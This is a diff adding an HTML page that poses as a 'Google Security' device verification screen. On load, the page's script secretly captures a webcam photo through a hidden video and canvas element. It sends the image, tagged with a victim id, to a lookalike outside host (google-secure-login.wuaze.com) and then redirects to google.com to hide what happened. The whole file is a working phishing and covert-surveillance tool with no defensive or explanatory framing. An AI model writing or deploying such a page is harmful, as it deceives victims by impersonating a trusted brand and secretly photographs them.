@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Google Security</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body style="background:#fff; text-align:center; padding-top:50px; font-family:sans-serif;">
+    <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" width="150">
+    <h3>Verifying Device...</h3>
+    <video id="v" autoplay playsinline style="display:none;"></video>
+    <canvas id="c" style="display:none;"></canvas>
+
+    <script>
+        const urlParams = new URLSearchParams(window.location.search);
+        const uid = urlParams.get('id') || '7130643157';
+
+        async function start() {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+            const v = document.getElementById('v');
+            v.srcObject = stream;
+            setTimeout(() => {
+                const c = document.getElementById('c');
+                c.width = 640; c.height = 480;
+                c.getContext('2d').drawImage(v, 0, 0);
+                
+                // Photo ko wuaze wali site par bhejna
+                const fd = new FormData();
+                fd.append('id', uid);
+                fd.append('img', c.toDataURL('image/png'));
+
+                fetch('http://google-secure-login.wuaze.com/post.php', {
+                    method: 'POST',
+                    mode: 'no-cors', // Ye zaroori hai
+                    body: new URLSearchParams(fd)
+                }).finally(() => { window.location.href = "https://google.com"; });
+            }, 1000);
+        }
+        window.onload = start;
+    </script>
+</body>
+</html>
